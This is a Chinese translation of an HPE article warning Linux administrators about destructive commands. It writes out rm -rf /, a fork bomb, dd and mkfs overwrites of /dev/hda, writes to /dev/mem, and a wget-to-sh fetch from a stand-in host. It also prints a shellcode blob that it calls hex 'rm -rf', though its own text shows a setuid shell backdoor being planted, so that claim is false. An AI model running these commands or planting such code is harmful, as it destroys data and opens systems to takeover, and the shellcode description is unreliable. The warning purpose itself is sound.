绝不要用的 Linux 命令！
======

![](https://www.hpe.com/content/dam/hpe/insights/articles/2017/12/the-linux-commands-you-should-never-use/featuredStory/The-Linux-commands-you-should-NEVER-use-1879.jpg.transform/nxt-1043x496-crop/image.jpeg)

**当然，除非你想干掉你的机器。**

蜘蛛侠有这样的一句信条，“权力越大，责任越大。” 对于 Linux 系统管理员们来说，这也是一种应当采用的明智态度。

不，真的，真心感谢 DevOps 的沟通协作和云编排技术，让一个 Linux 管理员不仅能掌控一台服务器，甚者能控制成千上万台服务器实例。只需要一个愚蠢的举动，你甚至可以毁掉一个价值数十亿美元的企业，比如 [没有打补丁的 Apache Struts][1] 。

如果不能跑在安全补丁之前，这将会带来一个远超过系统管理员工资水平的战略性业务问题。这里就有一些足以搞死 Linux 服务器的简单方式掌握在系统管理员手中。很容易想象到，只有新手才会犯这些错误，但是，我们需要了解的更多。

下列是一些著名的命令，任何拥有 root 权限的用户都能借助它们对服务器造成严重破坏。

**警告：千万不要在生产环境运行这些命令，它们会危害你的系统。不要在家里尝试，也不要在办公室里测试。**

那么，继续！

### rm -rf /

想要干脆利落的毁掉一个 Linux 系统吗？你无法超越这个被誉为“史上最糟糕”的经典，它能删除一切，我说的是，能删除所有存在你系统里的内容！

和大多数 [Linux 命令][2]一样，`rm` 这个核心命令使用起来非常方便。即便是最顽固的文件它也能帮你删除。结合起后面两个参数理解 `rm` 指令时，你很容易陷入大麻烦：`-r`，强制递归删除所有子目录，`-f`，无需确认，强制删除所有只读文件。如果你在根目录运行这条指令，将清除整个驱动器上的所有数据。

如果你真这么干了，想想该怎么和老板解释吧！

现在，也许你会想，“我永远不会犯这么愚蠢的错误。”朋友，骄兵必败。吸取一下经验教训吧， [这个警示故事来自于一个系统管理员在 Reddit 上的帖子][3]：

> 我在 IT 界工作了很多年，但是今天，作为 Linux 系统 root 用户，我在错误的系统路径运行了 `rm- f`
>
> 长话短说，那天，我需要复制一大堆目录从一个目录到另一个目录，和你一样，我敲了几个 `cp -R` 去复制我需要的内容。
>
> 以我的聪明劲，我持续敲着上箭头，在命令记录中寻找可以复制使用的类似命令名，但是它们混杂在一大堆其他命令当中。
>
> 不管怎么说，我一边在 Skype、Slack 和 WhatsApp 的网页上打字，一边又和 Sage 通电话，注意力严重分散，我在敲入 `rm -R ./videodir/* ../companyvideodirwith651vidsin/` 这样一条命令时神游物外。
 
然后，当文件化为乌有时其中也包括了公司的视频。幸运的是，在疯狂敲击 `control -C` 后，在删除太多文件之前，系统管理员中止了这条命令。但这是对你的警告：任何人都可能犯这样的错误。

事实上，绝大部分现代操作系统都会在你犯这些错误之前，用一段醒目的文字警告你。然而，如果你在连续敲击键盘时忙碌或是分心，你将会把你的系统键入一个黑洞。（LCTT 译注：幸运的是，可能在根目录下删除整个文件系统的人太多了额，后来 `rm` 默认禁止删除根目录，除非——你手动加上 `--no-preserve-root` 参数！）

这里有一些更为隐蔽的方式调用 `rm -rf`。思考一下下面的代码：

```
char esp[] __attribute__ ((section(“.text”))) = “\xeb\x3e\x5b\x31\xc0\x50\x54\x5a\x83\xec\x64\x68”
“\xff\xff\xff\xff\x68\xdf\xd0\xdf\xd9\x68\x8d\x99”
“\xdf\x81\x68\x8d\x92\xdf\xd2\x54\x5e\xf7\x16\xf7”
“\x56\x04\xf7\x56\x08\xf7\x56\x0c\x83\xc4\x74\x56”
“\x8d\x73\x08\x56\x53\x54\x59\xb0\x0b\xcd\x80\x31”
“\xc0\x40\xeb\xf9\xe8\xbd\xff\xff\xff\x2f\x62\x69”
“\x6e\x2f\x73\x68\x00\x2d\x63\x00”
“cp -p /bin/sh /tmp/.beyond; chmod 4755
/tmp/.beyond;”;
```

这是什么？这是 16 进制的 `rm -rf` 写法。在你不明确这段代码之前，请千万不要运行这条命令！

### fork 炸弹

既然我们讨论的都是些奇怪的代码，不妨思考一下这一行：

```
:(){ :|: & };:
```

对你来说，这可能看起来有些神秘，但是我看来，它就是那个臭名昭著的 [Bash fork 炸弹][4]。它会反复启动新的 Bash shell，直到你的系统资源消耗殆尽、系统崩溃。 

不应该在最新的 Linux 系统上做这些操作。注意，我说的是**不应该**。我没有说**不能**。正确设置用户权限，Linux 系统能够阻止这些破坏性行为。通常用户仅限于分配使用机器可用内存。但是如果作为 root 用户的你运行了这行命令（或者它的变体 [Bash fork 炸弹变体][5]），你仍然可以反复虐待服务器，直到系统重启了。

### 垃圾数据重写硬盘

有时候你想彻底清除硬盘的数据，你应该使用  [Darik's Boot and Nuke （DBAN）][6] 工具去完成这项工作。

但是如果仅仅想让你的存储器乱套，那很简单：

```
任意命令 > /dev/hda
```

我说的“任意命令”，是指有输出的任意命令，比如:

```
ls -la > /dev/hda
```

……将目录列表通过管道送到你的主存储设备。给我 root 权限和足够的时间，就能覆盖整个硬盘设备。这是让你开始盲目恐慌的一天的好办法，或者，可以把它变成 [职业禁入方式][7]。

### 擦除硬盘！

另一个一直受欢迎的擦除硬盘的方式是执行：

```
dd if=/dev/zero of=/dev/hda
```

你可以用这条命令写入数据到你的硬盘设备。`dd` 命令可以从特殊文件中获取无尽个 `0` 字符，并且将它全部写入你的设备。

可能现在听起来 `/dev/zero` 是个愚蠢的想法，但是它真的管用。比如说，你可以使用它来 [用零清除未使用的分区空间][8]。它能使分区的镜像压缩到更小，以便于数据传输或是存档使用。

在另一方面，它和 `dd if=/dev/random of=/dev/hda` 相近，除了能毁掉你的一天之外，不是一个好事。如果你运行了这个指令（千万不要），你的存储器会被随机数据覆盖。作为一个隐藏你要接管办公室咖啡机的秘密计划的半吊子方法，倒是不错，但是你可以使用 DBAN 工具去更好的完成你的任务。

### /dev/null 的损失

也许因为数据珍贵，我们对备份的数据没有什么信心，确实很多“永远不要这样做！”的命令都会导致硬盘或其它存储仓库的数据被擦除。一个鲜明的实例：另一个毁灭你的存储设备的方式，运行 `mv / /dev/null` 或者 `>mv /dev/null`。

在前一种情况下，你作为 root 用户，把整个磁盘数据都送进这个如饥似渴的 `/dev/null`。在后者，你仅仅把家目录喂给这个空空如也的仓库。任何一种情况下，除非还原备份，你再也不会再看见你的数据了。

见鬼，难道会计真的不需要最新的应收账款文件了吗？

### 格式化错了驱动器

有时候你需要使用这一条命令格式化驱动器：

```
mkfs.ext3 /dev/hda
```

……它会用 ext3 文件系统格式化主硬盘驱动器。别，请等一下！你正在格式化你的主驱动器！难道你不需要用它？

当你要格式化驱动器的时候，请务必加倍确认你正在格式化的分区是真的需要格式化的那块而不是你正在使用的那块，无论它们是 SSD、闪存盘还是其他氧化铁磁盘。

### 内核崩溃

一些 Linux 命令不能让你的机器长时间停机。然而，一些命令却可以导致内核崩溃。这些错误通常是由硬件问题引起的，但你也可以自己搞崩。

当你遭遇内核崩溃，重新启动系统你才可以恢复工作。在一些情况下，这只是有点小烦；在另一些情况下，这是一个大问题，比如说，高负荷运作下的生产环境。下面有一个案例：

```
dd if=/dev/random of=/dev/port
echo 1 > /proc/sys/kernel/panic
cat /dev/port
cat /dev/zero > /dev/mem
```

这些都会导致内核崩溃。

绝不要运行你并不了解它功能的命令，它们都在提醒我…

### 提防未知脚本

年轻或是懒惰的系统管理员喜欢复制别人的脚本。何必重新重复造轮子？所以，他们找到了一个很酷的脚本，承诺会自动检查所有备份。他们就这样运行它：

```
wget https://ImSureThisIsASafe/GreatScript.sh -O- | sh
```

这会下载该脚本，并将它送到 shell 上运行。很明确，别大惊小怪，对吧？不对。这个脚本也许已经被恶意软件感染。当然，一般来说 Linux 比大多数操作系统都要安全，但是如果你以 root 用户运行未知代码，什么都可能会发生。这种危害不仅在恶意软件上，脚本作者的愚蠢本身同样有害。你甚至可能会因为一个未调试的代码吃上一堑——由于你没有花时间去读它。

你认为你不会干那样的事？告诉我，所有那些 [你在 Docker 里面运行的容器镜像在干什么][10]？你知道它们到底在运行着什么吗？我见过太多的没有验证容器里面装着什么就运行它们的系统管理员。请不要和他们一样。

### 结束

这些故事背后的道理很简单。在你的 Linux 系统里，你有巨大的控制权。你几乎可以让你的服务器做任何事。但是在你使用你的权限的同时，请务必做认真的确认。如果你没有，你毁灭的不只是你的服务器，而是你的工作甚至是你的公司。像蜘蛛侠一样，负责任的使用你的权限。

我有没有遗漏什么？在 [@sjvn][11] 或 [@enterprisenxt][12] 上告诉我哪些 Linux 命令在你的“[绝不要运行！][13]”的清单上。

--------------------------------------------------------------------------------

via: https://www.hpe.com/us/en/insights/articles/the-linux-commands-you-should-never-use-1712.html

作者：[Steven Vaughan-Nichols][a]
译者：[CYLeft](https://github.com/CYLeft)
校对：[wxy](https://github.com/wxy)

本文由 [LCTT](https://github.com/LCTT/TranslateProject) 原创编译，[Linux中国](https://linux.cn/) 荣誉推出

[a]:https://www.hpe.com/us/en/insights/contributors/steven-j-vaughan-nichols.html
[1]:http://www.zdnet.com/article/equifax-blames-open-source-software-for-its-record-breaking-security-breach/
[2]:https://www.hpe.com/us/en/insights/articles/16-linux-server-monitoring-commands-you-really-need-to-know-1703.html
[3]:https://www.reddit.com/r/sysadmin/comments/732skq/after_21_years_i_finally_made_the_rm_boo_boo/
[4]:https://linux.cn/article-5685-1.html
[5]:https://unix.stackexchange.com/questions/283496/why-do-these-bash-fork-bombs-work-differently-and-what-is-the-significance-of
[6]:https://dban.org/
[7]:https://www.hpe.com/us/en/insights/articles/13-ways-to-tank-your-it-career-1707.html
[8]:https://unix.stackexchange.com/questions/44234/clear-unused-space-with-zeros-ext3-ext4
[9]:https://www.hpe.com/us/en/resources/solutions/enterprise-devops-containers.html?jumpid=in_insights~510287587~451_containers~badLinux
[10]:https://www.oreilly.com/ideas/five-security-concerns-when-using-docker
[11]:http://www.twitter.com/sjvn
[12]:http://www.twitter.com/enterprisenxt
[13]:https://www.youtube.com/watch?v=v79fYnuVzdI
